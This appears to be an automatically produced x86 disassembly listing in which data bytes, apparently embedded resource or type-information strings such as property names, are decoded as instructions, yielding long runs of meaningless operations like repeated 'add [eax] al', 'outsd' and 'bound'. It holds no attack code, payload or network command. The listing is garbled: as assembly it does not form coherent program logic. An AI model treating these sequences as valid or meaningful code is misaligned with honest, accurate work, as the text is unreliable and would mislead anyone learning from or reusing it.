add [ eax ] al
cwde
xor al [ esi ]
dec esp
add [ eax ] al
add [ eax + esi + 0x46 ] ah
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esi + ebx * 8 ] bh
or al 0x33
inc esp
jb r-xdata
insb
add al [ eax ]
add [ eax + 0x2e ] dh
inc esi
add [ ecx ] al
add [ esi ] al
push ebx
outsd
jne r-xdata
add [ eax ] al
add al 0x53
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ ebp + edx * 2 + 0x55e00040 ] ah
inc eax
add al ah
fiadd [ esi ]
adc al 0xdf
inc esi
add [ edi + ebx * 8 ] ch
inc esi
add [ esp + ebx * 8 - 0x2177ffba ] al
inc esi
add [ esp + ebx * 8 + 0x46 ] bl
add [ eax ] bh
fild [ esi ]
aam 0xdd
inc esi
add [ edi + ebx * 8 + 0x46 ] bl
add [ esi + ebx * 8 - 0x21b3ffba ] dh
inc esi
outsd
insb
outsb
je r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + ebp ] si
cmp bh bl
inc esi
add [ 0x65646948 ] cl
inc esp
jb r-xdata
add [ ebx + esi ] cl
inc ebx
outsd
outsb
je r-xdata
push ss
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
movsb [ edi ] [ esi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi ] si
dec esp
fiadd [ esi ]
push es
inc ebx
jb r-xdata
or [ ebx ] dh
inc esi
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] al
add cl ah
xor eax [ esi ]
dec edx
add dl bh
call [ esp + edx * 2 ]
inc esp
jb r-xdata
inc esi
add [ eax + 0x5c0046de ] cl
fadd [ esi ]
cmp bh bl
inc esi
add ah dl
fld [ esi ]
pop esp
fild [ esi ]
mov ah 0xde
inc esi
add [ esi + ebx * 8 + 0x46 ] cl
outsd
insb
jae r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 2 + 0x32 ] si
inc esi
add [ eax + 0x4631 ] ah
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
dec ecx
insd
popad
add eax [ gs : bx + si ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
or [ ebx ] dh
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub eax 0x46df5c00
add [ 0x776f6853 ] cl
inc esp
jb r-xdata
inc esi
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add al ah
fiadd [ esi ]
adc al 0xdf
inc esi
add [ edi + ebx * 8 ] ch
inc esi
add [ esp + ebx * 8 - 0x2177ffba ] al
inc esi
add [ esp + ebx * 8 + 0x46 ] bl
add [ eax ] al
xor [ fs : esi ] al
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax + 0x3c004058 ] dh
fiadd [ esi ]
sub al 0xde
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 4 + 0x30 ] si
inc esi
add [ eax + 0x2e ] dh
inc esi
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push esp
inc edx
popad
jae r-xdata
inc eax
add [ ecx + esi + 0x16070046 ] ah
popad
je r-xdata
sbb al 0xe0
outsd
insb
jae r-xdata
xor al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
xor [ eax ] eax
sbb bh 0x46
add [ ecx ] dl
inc edx
outsw
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp + 0x33940040 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
xor al 0x46
add [ eax ] al
add [ eax ] al
add al al
xor eax [ esi ]
add [ eax ] al
add [ eax ] al
int3
dec ecx
insd
popad
add eax [ gs : bx + si ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
or [ ebx ] dh
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
inc esi
add [ esi + ebx * 8 ] ch
outsd
insb
jae r-xdata
xor [ esi ] eax
pop es
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
mov al [ 0x4631 ]
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bl
test [ esi ] al
add al [ eax ]
or [ ecx + 0x43 ] al
outsd
outsb
je r-xdata
inc esp
jb r-xdata
add [ eax ] cl
add [ eax ] al
push es
inc esi
add al ah
xor al 0x46
add [ esi + 0x35 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ edx + 0x7c004635 ] cl
add [ eax ] al
add [ eax + esi + 0x46 ] ah
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
add [ eax ] al
add [ edx ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x36
inc eax
add [ esi + ebx * 8 ] bh
inc esi
add [ esi + ebx * 8 ] ch
mov al 0x58
inc esi
add [ esp + ebx * 8 + 0x46 ] bl
add al dl
fld [ esi ]
aam 0xdd
inc esi
add ah bl
fld [ esi ]
mov al ah
inc esi
add [ edi + ebx * 8 - 0x1f37ffba ] al
inc esi
add [ ecx + 0x46 ] al
add [ eax - 0x1f ] bl
inc esi
add [ ecx + 0x46 ] bh
add [ eax - 0x1f ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
inc esp
jbe r-xdata
inc esi
add [ ecx + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ esi + esi ] dh
inc esp
jae r-xdata
add [ ecx ] al
add [ edx ] al
fdiv [ ecx ]
inc esi
add [ edx ] al
add [ edx ] al
add al bl
test [ esi ] al
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bl ah
xor [ esi ] eax
add al [ eax ]
add al [ eax ]
fadd [ esi + eax * 2 + 0x4000 ]
outsd
insb
add al [ eax ]
add al [ eax ]
add [ ss : eax + 0x60046de ] cl
inc ecx
jae r-xdata
jb r-xdata
jo r-xdata
add al [ bx + si ]
add [ eax ] al
add eax [ eax ]
0x4c004635 0xa00
add dl dl
xor eax r--data
jae r-xdata
inc esi
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
fild [ esi ]
loopne r-xdata
add [ eax ] al
mov dh [ 0x7c0046 ]
jb r-xdata
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307ffff ] al
outsd
outsb
je r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
mov al [ 0x4631 ]
imul esp [ edi + 0x6e ] 0x3
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax ] dh
inc esi
popad
je r-xdata
inc esi
add [ edx ] cl
add al 0x0
andps xmm0 [ edx + esi * 2 + 0x61 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
or [ esi + 0x46 ] eax
insb
outsd
popad
je r-xdata
add al [ eax ]
add ah cl
test al 0x40
add [ eax + eax ] cl
add [ ecx ] cl
inc esi
inc esp
outsd
arpl [ ebx + 0x52 ] bp
arpl [ gs : edx + eax ] si
add [ ebx + ebp ] al
inc esi
add [ eax + eax ] bl
add [ edx ] cl
inc esi
inc esp
jb r-xdata
add [ eax ] al
xor [ fs : esi ] al
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
xor eax 0x7c0046
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
adc al 0x34
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
sbb [ esi + eax * 2 ] dh
add [ edi ] al
adc al 0x54
inc esp
jb r-xdata
add [ eax ] bh
fild [ esi ]
aam 0xdd
inc esi
add [ edi + ebx * 8 + 0x46 ] bl
add [ esi + ebx * 8 - 0x21b3ffba ] dh
inc esi
add [ eax ] al
add [ edx ] al
add [ ebx + 0x4a004632 ] ch
add [ esi ] al
add al bl
xor al [ esi ]
dec edx
add [ eax ] cl
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc esi
outsd
insb
mov eax eax
pop eax
xor al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ eax + r-xdata ] dl
pop es
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x34 ] si
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x2e ] dh
inc esi
add [ ecx ] al
add [ esi ] al
push ebx
outsd
jne r-xdata
or [ eax ] al
add al [ eax ]
xor [ esi ] dh
inc esi
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
xor [ esi ] dh
inc esi
outsd
insb
add al [ eax ]
add ah cl
test al 0x40
add [ eax + eax ] ah
add [ esi ] cl
inc esi
inc ebp
jb r-xdata
add ah ch
fild [ esi ]
pop es
inc esp
jae r-xdata
outsb
inc esp
jb r-xdata
jo r-xdata
add [ eax + 0x3c004058 ] dh
fiadd [ esi ]
sub al 0xde
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4408ffff ] al
outsd
arpl [ ebx + 0x52 ] bp
arpl [ gs : esp + eax + 0x2b ] si
inc esi
add [ eax + eax ] bl
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4409ffff ] al
jb r-xdata
outsd
insb
jae r-xdata
inc esi
add [ eax + 0x4631 ] ah
imul ecx [ edi + 0x62 ] 0x6a
arpl [ gs : eax + 0x34 ] si
outsd
insb
add al [ eax ]
add al [ eax ]
daa
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bl
test [ esi ] al
add al [ eax ]
or [ ecx + 0x43 ] al
outsd
outsb
je r-xdata
add [ edx ] al
add [ eax ] dh
inc esi
jae r-xdata
outsd
outsb
je r-xdata
jb r-xdata
add al 0x53
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edi ] si
test bh bl
inc esi
add [ esi ] al
inc ebx
insb
imul esp [ edi + 0x6e ] 0xd8000002
test [ esi ] al
pushad
add [ eax ] al
add [ esi ] cl
inc esi
inc eax
add [ ebp + edx * 2 - 0x2013ffc0 ] ah
inc esi
add al ah
fiadd [ esi ]
insb
loope r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
xchg esp eax
xor eax [ esi ]
dec [ edi ]
inc ebp
jb r-xdata
jo r-xdata
add [ eax ] cl
add [ edx ] al
xchg esi eax
inc esi
add [ edx ] al
add [ edx ] al
mov dh 0x36
inc esi
add [ edx ] al
add [ edx ] al
fnstenv [ esi ]
inc esi
add [ edx ] al
add [ edx ] al
std
inc esi
add [ edx ] al
add [ edx ] al
and eax 0x2004637
inc esp
outsd
arpl [ ebx + 0x52 ] bp
arpl [ gs : edx + eax ] si
add [ eax ] al
adc [ eax ] al
je r-xdata
add [ eax ] cl
inc ebx
jns r-xdata
add [ edx ] al
add al [ eax ]
add ah [ 0x2004637 ]
imul esp [ edi + 0x6e ] 0x3
add [ eax ] al
inc esi
inc edx
jb r-xdata
dec eax
add [ eax ] al
add [ esi ] al
add [ ebp + ebx * 8 - 0x237bffba ] dh
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp [ esi ] al
add [ eax ] al
add [ eax ] al
pop eax
cmp [ esi ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
cmp bh 0xff
or eax 0x73617245
inc esp
outsd
arpl [ ebx + 0x52 ] bp
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax + eax ] bh
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
insb
imul esp [ edi + 0x6e ] r-xdata
pushad
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440dffff ] al
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ edx ] al
add [ edx ] al
0x2004637 0x200
add [ esi + esi * 2 + 0x44 ] al
add [ eax ] cl
add bh bh
jl r-xdata
insb
add al [ eax ]
add al [ eax ]
add [ ss : eax ] bl
inc esi
add [ esi ] al
inc ecx
jae r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
xor [ esi ] dh
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] dh
inc esi
add [ eax ] al
dec eax
xor al 0x46
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x38 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x46 ] ah
add [ eax + eax ] bh
add [ eax + 0x34 ] cl
inc esi
push edi
add [ eax ] 0x0
add [ eax + 0x4608ffff ] al
insb
outsd
jo r-xdata
dec ebp
aaa
inc esi
add [ edx ] al
add [ edx ] al
ja r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4205ffff ] al
jb r-xdata
inc eax
add [ esi + ebx * 8 ] bh
inc esi
add [ ecx + 0x58d80046 ] al
mov al 0x58
inc esi
add [ ecx + 0x46 ] ch
add [ ebp + ebx * 8 - 0x237bffba ] dh
inc esi
add [ eax ] bl
inc esi
add [ esp + ebx * 8 + 0x46 ] bl
add al dl
fld [ esi ]
aam 0xdd
inc esi
add ah bl
fld [ esi ]
mov al ah
inc esi
add [ edi + ebx * 8 - 0x1f37ffba ] al
inc esi
add [ ecx + 0x46 ] al
add [ eax ] al
cmp [ fs : esi ] al
jl r-xdata
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
loope r-xdata
outsb
pushfd
adc [ eax ] al
cmp [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push 0x6f4d6e65
jbe r-xdata
push edi
outsb
add [ fs : eax ] al
jmp [ eax + eax ]
jae r-xdata
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
xor [ eax ] eax
test cl ah
inc esi
add [ ecx ] dl
inc edx
outsw
jb r-xdata
loope r-xdata
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
fild [ esi ]
loopne r-xdata
add al bl
pop eax
popad
je r-xdata
outsd
insb
int3
inc ebx
outsd
outsb
je r-xdata
int3
fiadd [ eax + eax + 0x40 ]
fiadd [ eax + eax - 0x78 ]
fiadd [ eax + eax + 0x68 ]
fiadd [ eax + eax - 0x4c ]
fiadd [ eax + eax - 0xc ]
into
inc esp
add [ eax ] cl
iretd
outsd
insb
jae r-xdata
enter 0x463a 0x0
enter 0x4639 0x0
pop ss
cmp al [ esi ]
add [ eax ] al
add [ eax ] al
xor edi [ edx ]
inc esi
inc esp
jae r-xdata
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x4638 ] ch
add [ eax - 0x1f ] bl
inc esi
add [ ecx + 0x46 ] bh
add [ eax - 0x1f ] bh
inc esi
add [ eax ] al
add [ ecx ] al
add [ esi + 0x38 ] dh
inc esi
add [ edx ] cl
cli
call [ ecx ]
push esp
inc esp
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] dh
cmp [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] ch
add [ esi + eax * 4 + 0x56ac0044 ] cl
jb r-xdata
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ah
inc esi
add [ ebx + edx + 0x13a40043 ] bl
inc ebx
add ah cl
adc al [ ebx ]
mov ah 0xda
inc esp
add ah bh
add [ eax ] al
mov [ esi + 0x56ac0044 ] es
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
nop
lodsb [ esi ]
cmp [ esi ] al
pop es
adc [ esp + eax * 2 + 0x72 ] edx
popad
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
sbb [ eax ] bh
inc esi
add [ eax ] dh
inc esi
add [ eax ] al
add [ eax ] cl
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
test al 0x38
inc esi
add [ eax ] al
sub_46395a
inc esp
add [ eax ] al
loopne r-xdata
add al bl
fld [ eax + eax + 0x20 ]
fiadd [ eax + eax + 0x28 ]
fiadd [ eax + eax + 0x78 ]
fiadd [ eax + eax + 0x6c ]
fld [ eax + eax - 0x20 ]
fiadd [ eax + eax - 0x44 ]
fadd [ eax + eax - 0x38 ]
fild [ eax + eax + 0x10 ]
hlt
add [ ecx + edx * 8 - 0x2e23ffbc ] al
inc esp
add [ eax - 0x7fffbb2c ] ah
aad 0x44
add [ esi + edx * 8 ] ch
inc esp
add al ah
salc
inc esp
add [ edi + edx * 8 ] dl
inc esp
add [ edi + edx * 8 + 0x44 ] bl
add [ eax - 0x17ffbb29 ] bl
xlat
inc esp
add [ eax + ebx * 8 ] ch
inc esp
add [ eax + ebx * 8 + 0x44 ] ah
add [ eax - 0x17ffbb28 ] dl
fadd [ eax + eax + 0x24 ]
fld [ eax + eax + 0x60 ]
fld [ eax + eax - 0x64 ]
fld [ eax + eax - 0x28 ]
sub_463b20
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi + eax * 2 ] bh
add ah cl
cmp eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
cmp al 0x46
add [ eax + eax - 0x47040000 ] dh
dec eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_46463d
adc al [ ebx ]
push eax
add ecx [ eax ]
sub [ 0x3640048 ] al
dec eax
add ah al
add cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
fadd [ esi + eax * 2 + 0x400 ]
add [ eax ] cl
inc esi
inc ebx
outsd
outsb
je r-xdata
[ ebx + 0x42004647 ]
outsd
insb
add al [ eax ]
add al al
inc ebp
inc esi
add [ eax ] cl
add [ eax ] al
add [ 0x66654c46 ] al
je r-xdata
rol [ ebp + 0x46 ] 0x0
or al 0x0
add [ eax ] al
add al 0x46
push esp
outsd
jo r-xdata
add [ eax ] al
rol [ ebp + 0x46 ] 0x0
adc [ eax ] al
add [ eax ] al
push es
inc esi
push edx
imul esp [ edi + 0x68 ] 0x274
rol [ ebp + 0x46 ] 0x0
adc al 0x0
add [ eax ] al
pop es
inc esi
inc edx
outsd
je r-xdata
add [ eax ] al
outsb
je r-xdata
outsd
insd
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] bl
add [ eax ] al
add [ ecx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add [ eax ] al
add al 0x0
hlt
add [ eax ] al
adc [ eax ] al
or [ eax ] al
or [ ecx + 0x6c ] al
outsd
insb
add al [ eax ]
add al [ eax ]
add [ eax ] 0xdc
add ecx [ eax ]
adc [ ebx + 0x65 ] dl
je r-xdata
add [ edx ] al
add [ edi ] ah
in al dx
add al 0x48
add [ ecx ] cl
push ebx
je r-xdata
outsd
outsb
je r-xdata
imul esp [ edi + 0x6e ] 0x2676e69
add [ edx ] al
add [ ecx ] dl
enter 0x4804 0x0
adc [ ebx + 0x65 ] dl
je r-xdata
inc eax
add [ eax ] dl
add [ esi ] al
outsd
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x274
pushfd
adc [ eax ] al
or [ eax ] al
pop es
inc ecx
inc edx
outsd
je r-xdata
outsd
jne r-xdata
dec esp
je r-xdata
outsd
insb
inc edx
outsd
jne r-xdata
add al cl
outsd
insb
inc edx
outsd
jne r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
outsd
insd
add al [ eax ]
add al [ eax ]
nop
push 0x7004648
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jae r-xdata
pushfd
adc [ eax ] al
add al [ eax ]
add al 0x41
push esp
outsd
jo r-xdata
add [ eax ] al
je r-xdata
jae r-xdata
add al 0x48
add [ eax ] dl
push ebx
je r-xdata
jae r-xdata
je r-xdata
inc ebp
inc esi
add [ eax + eax ] dl
add bh bh
test [ ebx ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
cwde
pushad
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
add [ eax ] al
adc [ eax ] al
add eax 0x46486400
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x66654c41
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ 0x46486400 ] al
pushfd
adc [ eax ] al
or al 0x0
push es
inc ecx
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
dec eax
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ 0x63655241 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ eax + ecx * 2 + 0x46 ] ah
add [ eax ] al
adc al 0x0
push es
add [ eax + ecx * 2 + 0x46 ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax 0x66654c41
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dl
or [ ebp + ecx * 2 + 0x61 ] dl
jb r-xdata
add [ edi ] al
inc ebp
inc esi
add [ eax + eax ] cl
add bh bh
test [ ebx ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
or eax [ ebx + 0x6f ]
outsd
insd
or eax 0x49640200
inc esi
add [ edx ] al
add [ edx ] al
mov cl [ ecx + 0x46 ]
add [ edx ] al
add [ edx ] al
scasd [ edi ]
dec ecx
inc esi
add [ edx ] al
add [ edx ] al
salc
dec ecx
inc esi
add [ edx ] al
add [ edx ] al
dec [ ecx + 0x46 ]
add [ eax ] cl
add [ eax ] al
inc [ ebx + eax + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add al 0x4c
add al al
inc ebp
inc esi
add [ eax ] dl
inc eax
add [ edx ] al
add [ eax ] cl
inc ecx
insb
imul esp [ edi + 0x6e ] 0x2676e69
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add al 0x41
push esp
outsd
jo r-xdata
add [ eax ] al
je r-xdata
add al 0x0
rol [ ebp + 0x46 ] 0x0
or [ eax ] al
add bh bh
test [ ebx ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
inc ebp
inc esi
add [ eax ] dl
add [ eax ] al
inc [ ebx + eax + 0x10048 ]
add [ eax ] al
add al [ eax ]
outsd
insb
dec eax
imul esp [ gs : edi + 0x68 ] 0x40109c74
add [ eax ] dl
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x450cffff ] al
js r-xdata
outsd
insb
dec esp
je r-xdata
outsb
je r-xdata
inc esi
add [ edx ] al
add [ edx ] al
pushfd
dec edx
inc esi
add [ edx ] al
add [ ebx ] al
xchg [ eax + 0x46 ] ecx
add [ edx ] al
inc ecx
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x9c000002
adc [ eax ] al
or al 0x0
pop es
inc ecx
dec eax
imul esp [ gs : edi + 0x68 ] 0x274
add [ eax ] dl
inc eax
add [ eax ] cl
add [ eax ] cl
inc ecx
insb
pushfd
adc [ eax ] al
adc [ eax ] al
push es
add [ eax ] al
dec [ esi ]
insb
imul esp [ ebx + 0x69 ] 0x66654c74
je r-xdata
add [ edx ] al
add [ edx ] al
and eax 0x200464a
add [ edx ] al
dec ebx
dec edx
inc esi
add [ edx ] al
add [ edx ] al
jae r-xdata
adc [ eax ] al
adc [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x430affff ] al
outsd
outsb
je r-xdata
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax + 0x8004312 ] ah
add ecx [ eax ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
insb
imul esp [ ebx + 0x69 ] 0x69654874
push 0x4246d474
add [ eax ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
cmp bh 0xff
or al 0x43
adc [ eax ] al
adc [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add eax 0x0
add [ eax ] al
cmp bh 0xff
or eax [ ebp + 0x78 ]
jo r-xdata
outsd
insb
push esp
outsd
jo r-xdata
js r-xdata
outsd
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x430dffff ] al
outsd
outsb
je r-xdata
add [ eax + 0x4f08ffff ] al
outsb
add [ eax ] al
imul esp [ ebx + 0x69 ] 0x706f5474
pushfd
adc [ eax ] al
adc [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
or eax 0x6c707845
add [ ebx ] al
cmpsb [ esi ] [ edi ]
dec eax
inc esi
add [ edx ] al
add [ ebx ] al
les ecx [ eax + 0x46 ]
add [ edx ] al
add [ ebx ] al
in al 0x48
inc esi
add [ edx ] al
add [ edx ] al
add [ eax + edx + 0x100040 ] bl
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x430bffff ] al
outsd
outsd
outsb
je r-xdata
adc [ eax ] al
adc [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x430cffff ] al
inc ebx
push 0x65676e61
nop
sbb [ ebx + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
or [ edi + 0x6e ] cl
insb
jo r-xdata
